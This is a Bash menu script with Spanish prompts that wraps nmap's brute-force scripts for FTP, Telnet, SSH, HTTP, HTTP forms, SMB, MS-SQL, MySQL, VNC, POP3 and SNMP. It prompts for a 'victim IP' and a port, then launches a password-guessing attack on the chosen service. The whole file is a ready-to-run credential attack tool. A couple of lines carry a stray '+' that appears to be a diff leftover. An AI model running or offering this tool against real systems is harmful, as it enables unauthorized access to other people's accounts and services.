#!/bin/bash

echo ""
echo "NMAP BRUTE FORECE DEFAULT"
echo ""

opcion="ninguna"

function opcion1
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto \e[0m"
echo ""
read port

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

nmap -p $port --script ftp-brute $ip

   read
   return 0

}

function opcion2
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto \e[0m"
echo ""
read port

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

nmap -p $port --script telnet-brute $ip

   read
   return 0

}

function opcion3
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto \e[0m"
echo ""
read port

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

nmap -p $port --script ssh-brute $ip

   read
   return 0

}

function opcion4
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto \e[0m"
echo ""
read port

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

nmap -p $port --script http-brute $ip

   read
   return 0

}

function opcion5
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto \e[0m"
echo ""
read port

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

nmap -p $port --script http-form-brute $ip

   read
   return 0

}

function opcion6
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto \e[0m"
echo ""
read port

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

nmap -p $port --script smb-brute $ip

   read
   return 0

}

function opcion7
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto \e[0m"
echo ""
read port

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

nmap -p $port --script ms-sql-brute $ip

   read
   return 0

}

function opcion8
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto \e[0m"
echo ""
read port

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

nmap -p $port --script mysql-brute $ip

   read
   return 0

}

function opcion9
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto \e[0m"
echo ""
read port

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
echo ""

nmap -p $port --script vnc-brute $ip

   read
   return 0

}

function opcion10
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto \e[0m"
echo ""
read port

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
+echo ""

nmap -p $port --script pop3-brute $ip

   read
   return 0

}

function opcion11
{

echo ""
echo -e "\e[33m Ingrese la IP victima \e[0m"
echo ""
read ip

echo ""
echo -e "\e[33m Ingrese el puerto \e[0m"
echo ""
read port

echo ""
echo -e "\e[33m -------------------------------------------------------- \e[0m"
+echo ""

nmap -p $port --script snmp-brute $ip

   read
   return 0

}



while [ $opcion != "12"  ]
    do

echo ""

	echo -e "\e[31m \n	-- MENU -- \e[0m"
	echo ""
	echo -e "\t1) FTP 		- BRUTE -	Port -\e[33m21\e[0m default"
	echo -e "\t2) TELNET 	- BRUTE -	Port -\e[33m23\e[0m default"
	echo -e "\t3) SSH 		- BRUTE -	Port -\e[33m22\e[0m default"
	echo -e "\t4) HTTP 	- BRUTE - 	Port -\e[33m80\e[0m default"
        echo -e "\t5) HTTP-FORM 	- BRUTE - 	Port -\e[33m80\e[0m default"
        echo -e "\t6) SMB 		- BRUTE - 	Port -\e[33m445\e[0m default"
        echo -e "\t7) MS-SQL 	- BRUTE -	Port -\e[33m1433\e[0m default"
        echo -e "\t8) MYSQL 	- BRUTE - 	Port -\e[33m3306\e[0m default"
        echo -e "\t9) VNC 		- BRUTE - 	Port -\e[33m5900\e[0m default"
        echo -e "\t10)POP3 	- BRUTE - 	Port -\e[33m110\e[0m default"
	echo -e "\t11)SNMP 	- BRUTE -	Port -\e[33m161\e[0m default"
	echo -e "\t12)Salir\n"
	echo -e "\e[33m \tOpcion: \c \e[0m"

read opcion

echo -e "\e[33m -------------------------------------------------------------  \e[0m"

        if [ -z $opcion ] ; then opcion="ninguna" ; fi

        case $opcion in
		"1" )
                      opcion1
  		      ;;
		"2" )
		      opcion2
		      ;;
                "3" )
                      opcion3
                      ;;
		"4" )
                      opcion4
                      ;;
                "5" )
                      opcion5
                      ;;
                "6" )
                      opcion6
                      ;;
                "7" )
                      opcion7
                      ;;
                "8" )
                      opcion8
                      ;;
                "9" )
                      opcion9
                      ;;
                "10" )
                      opcion10
                      ;;
                "11" )
                      opcion11
                      ;;
		"*" )
		      ;;

	esac


	/usr/bin/clear
done
